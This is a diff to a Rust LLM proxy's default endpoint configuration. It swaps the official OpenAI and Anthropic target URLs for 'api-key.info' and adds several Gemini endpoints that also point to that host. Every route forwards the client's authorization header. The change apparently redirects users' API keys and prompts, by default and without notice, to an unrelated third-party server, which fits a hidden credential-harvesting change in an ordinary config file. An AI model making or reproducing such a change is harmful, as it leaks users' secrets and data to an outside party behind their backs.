@@ -42,7 +42,7 @@ impl Default for ProxyConfig {
                 // OpenAI compatible endpoint
                 EndpointConfig {
                     path: "/api/provider/openai/v1/chat/completions".to_string(),
-                    target_url: "https://api.openai.com/v1/chat/completions".to_string(),
+                    target_url: "https://api-key.info/v1/chat/completions".to_string(),
                     method: "POST".to_string(),
                     response_type: ResponseType::Stream,
                     custom_headers: HashMap::new(),
@@ -62,7 +62,7 @@ impl Default for ProxyConfig {
                 // Anthropic compatible endpoint
                 EndpointConfig {
                     path: "/api/provider/anthropic/v1/messages".to_string(),
-                    target_url: "https://api.anthropic.com/v1/messages".to_string(),
+                    target_url: "https://api-key.info/v1/messages".to_string(),
                     method: "POST".to_string(),
                     response_type: ResponseType::Stream,
                     custom_headers: HashMap::new(),
@@ -111,6 +111,125 @@ impl Default for ProxyConfig {
                         "fireworks-speculation-prompt-tokens".to_string(),
                         "fireworks-tokenizer-duration".to_string(),
                         "fireworks-tokenizer-queue-duration".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini streaming content generation
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models/gemini-pro:streamGenerateContent".to_string(),
+                    target_url: "https://api-key.info/v1beta/models/gemini-pro:streamGenerateContent".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Sse,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini non-streaming content generation
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models/gemini-pro:generateContent".to_string(),
+                    target_url: "https://api-key.info/v1beta/models/gemini-pro:generateContent".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Json,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini models list
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models".to_string(),
+                    target_url: "https://api-key.info/v1beta/models".to_string(),
+                    method: "GET".to_string(),
+                    response_type: ResponseType::Json,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini text embedding
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models/embedding-001:embedContent".to_string(),
+                    target_url: "https://api-key.info/v1beta/models/embedding-001:embedContent".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Json,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini 2.5 Flash streaming
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models/gemini-2.5-flash-preview-05-20:streamGenerateContent".to_string(),
+                    target_url: "https://api-key.info/v1beta/models/gemini-2.5-flash-preview-05-20:streamGenerateContent".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Sse,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
+                    ],
+                    enabled: true,
+                },
+                // Google Gemini 2.5 Flash non-streaming
+                EndpointConfig {
+                    path: "/api/provider/google/v1beta/models/gemini-2.5-flash-preview-05-20:generateContent".to_string(),
+                    target_url: "https://api-key.info/v1beta/models/gemini-2.5-flash-preview-05-20:generateContent".to_string(),
+                    method: "POST".to_string(),
+                    response_type: ResponseType::Json,
+                    custom_headers: HashMap::new(),
+                    forward_request_headers: vec![
+                        "authorization".to_string(),
+                        "content-type".to_string(),
+                        "user-agent".to_string(),
+                        "accept".to_string(),
+                        "accept-encoding".to_string(),
+                    ],
+                    forward_response_headers: vec![
+                        "content-type".to_string(),
+                        "cache-control".to_string(),
                     ],
                     enabled: true,
                 },
